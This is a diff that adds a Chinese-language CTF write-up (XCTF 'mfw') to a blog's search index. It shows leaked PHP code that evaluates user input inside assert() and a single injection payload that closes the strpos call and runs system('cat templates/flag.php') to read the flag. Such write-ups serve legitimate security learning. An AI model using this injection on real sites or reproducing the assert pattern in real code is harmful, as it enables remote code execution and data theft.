@@ -1073,4 +1073,20 @@
 <p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-20.2.png?raw=true"></p>
 ]]></content>
   </entry>
+  <entry>
+    <title>web-21 XCTF mfw</title>
+    <url>/2021/01/31/web-21/</url>
+    <content><![CDATA[<h1 id="web-21-XCTF-mfw"><a href="#web-21-XCTF-mfw" class="headerlink" title="web-21 XCTF mfw"></a>web-21 XCTF mfw</h1><p>网站挺好，大概有源码泄露，githack扫一下，得到源代码(截取PHP部分)</p>
+<a id="more"></a>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line">&gt;?</span><br></pre></td></tr></table></figure>
+
+<p>要查看的文件名file是可以控制的，但”..”被禁用了不能用类似”../../../../../flag.php”的形式查看flag了。</p>
+<p>但assert函数是存在任意代码执行漏洞，因此我们可以先尝试闭合strpos函数，省下的部分就是任意代码执行了。</p>
+<p>只要构造payload</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?page=<span class="string">&#x27;).system(&quot;cat templates/flag.php&quot;);//</span></span><br></pre></td></tr></table></figure>
+
+<p>得到flag！</p>
+]]></content>
+  </entry>
 </search>
